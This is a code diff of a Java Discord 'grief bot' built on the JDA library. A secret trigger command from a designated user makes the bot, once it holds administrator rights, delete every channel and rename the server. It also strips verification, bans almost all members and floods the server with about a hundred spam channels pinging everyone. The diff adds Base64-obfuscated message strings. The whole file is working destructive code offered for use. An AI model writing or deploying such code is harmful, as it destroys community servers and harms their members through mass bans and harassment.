@@ -1,10 +1,11 @@
 package de.corruptedbytes;
 
-import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
 import java.util.Random;
 
 import de.corruptedbytes.utils.Config;
-import de.corruptedbytes.utils.ErrorHandler;
+import de.corruptedbytes.utils.Shelv;
 import de.corruptedbytes.utils.Utils;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.ChannelType;
@@ -20,71 +21,75 @@ import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
 
 public class GriefBotListener extends ListenerAdapter {
-	
+
 	@Override
 	public void onReady(ReadyEvent e) {
 		Utils.sendInfo();
 	}
-	
-	
+
 	@Override
 	public void onMessageReceived(MessageReceivedEvent e) {
 		if (e.isFromType(ChannelType.TEXT)) {
-			Message msg = e.getMessage();
-			Guild g = e.getGuild();
-			User u = e.getMessage().getAuthor();
-						
-			if (msg.getContentDisplay().equalsIgnoreCase(GriefBot.instance.griefCommand) && u.getId() == GriefBot.instance.grieferUserID) {
-				try { msg.delete().queue(); } catch (Exception ignored) {}
+			Message message = e.getMessage();
+			Guild guild = e.getGuild();
+			User user = e.getMessage().getAuthor();
+
+			if (message.getContentDisplay().equalsIgnoreCase(GriefBot.getInstance().getGriefCommand())
+					&& user.getId().startsWith(GriefBot.getInstance().getGrieferUserID())) {
 				try {
-					if (g.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
-						startGrief(g, u);
-					}
-					else
-					{
-						new ErrorHandler("It is highly recommended to give the bot administrator rights.");
+					if (guild.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
+
+						try {
+							message.delete().queue();
+						} catch (Exception ignored) {
+						}
+
+						startGrief(guild, user);
+					} else {
+						message.getChannel().sendMessage(":x: The Bot works only with **Administrator** Permission!")
+								.queue();
 					}
 				} catch (Exception ex) {
-					new ErrorHandler(ex.getMessage());
+					System.err.println("Error: " + ex.getMessage());
 				}
 			}
 		}
 	}
-	
-	public void startGrief(Guild g, User u) throws IOException {
-		String name = GriefBot.instance.griefMessage.replace("%NAME%", u.getName());
-		g.getManager().setIcon(Icon.from(Config.griefPicture)).queue();
-		g.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
-		g.getManager().setName(name).queue();
-		
-		g.getChannels().forEach(key -> {
+
+	public void startGrief(Guild guild, User user) throws Exception {
+		String name = GriefBot.getInstance().getGriefMessage().replace("%NAME%", user.getName());
+		guild.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
+		guild.getManager().setName(name).queue();
+		guild.getManager().setIcon(Icon.from(Config.griefPicture)).queue();
+
+		guild.getChannels().forEach(key -> {
 			key.delete().queue();
-		});		
-		
-		g.createTextChannel("fucked").complete();
-		
-		for (Member members : g.getMembers()) {
-			if (members.isOwner() || members.getUser().isBot() || members.getId() == GriefBot.instance.grieferUserID) {
+		});
+
+		TextChannel base = guild
+				.createTextChannel(new String(Base64.getDecoder().decode(Shelv.ASCII_EMOJI), StandardCharsets.UTF_8))
+				.complete();
+		base.sendMessage(new String(Base64.getDecoder().decode(Shelv.ASCII_MEME), StandardCharsets.UTF_8)).queue();
+
+		for (Member members : guild.getMembers()) {
+			if (members.isOwner() || members.getUser().isBot()
+					|| members.getId() == GriefBot.getInstance().getGrieferUserID()) {
 				continue;
-			} 
-			else
-			{
-				members.getGuild().ban(members.getUser(), 7, "fucked").queue();
+			} else {
+				members.getGuild().ban(members.getUser(), 0, "fucked").queue();
 			}
 		}
 
-		for (int i = 0; i < 105; i++) {
-			if (i <= 100) {
-				try {
-					TextChannel grief = g.createTextChannel((name + "-" + new Random().nextInt(Integer.MAX_VALUE)).toLowerCase()).complete();
-					grief.sendMessage("@everyone YOUR DISCORD SERVER WAS GRIEFED!").queue();
-					grief.sendFile(Config.griefPicture).queue();
-				} catch (Exception ignored) {}
-			}
-			else
-			{
-				g.leave().queue();
-				break;
+		int amount = 105;
+
+		for (int i = 0; i < amount; i++) {
+			try {
+				TextChannel grief = guild
+						.createTextChannel((name + "-" + new Random().nextInt(amount + 10)).toLowerCase()).complete();
+				grief.sendMessage("> @everyone YOUR DISCORD SERVER WAS GRIEFED!").queue();
+				grief.sendFile(Config.griefPicture).queue();
+				guild.createVoiceChannel((name + "-" + new Random().nextInt(amount + 10)).toUpperCase()).queue();
+			} catch (Exception ignored) {
 			}
 		}
 	}
